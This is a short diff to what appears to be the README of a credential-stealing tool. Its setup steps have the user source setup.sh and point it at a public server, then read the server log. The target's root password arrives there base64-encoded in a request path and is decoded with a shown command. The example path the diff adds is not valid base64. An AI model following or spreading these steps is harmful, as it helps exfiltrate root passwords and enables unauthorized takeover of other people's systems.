@@ -11,5 +11,5 @@ The following commands shall be executed in the terminal.
 6. Setup the program<br>`chmod a+x setup.sh`<br>`source setup.sh`
 7. Clear the screen<br>`clear`
 8. Enter the public URL for the server you made (NOT 127.0.0.1)<br>`Site (include https:// or http://) <<< [your url]`
-9. Once the server log says something, copy the end of the url (e.x. `ip - - [time] "GET /<u>i-am-the-end-of-a-url</u> HTTP/1.1" 404 -`)and decode it<br>`echo [end of url] | base64 -d`, That's the root password!
+9. Once the server log says something, copy the end of the url (e.x. `0.0.0.0 - - [January/1/2021 10:23] "GET /`**`qfgghheyfhrf;e/vfrtgisfkdgiyes`**` HTTP/1.1" 404 -`)and decode it<br>`echo [end of url] | base64 -d`, That's the root password!
 10. That's it!
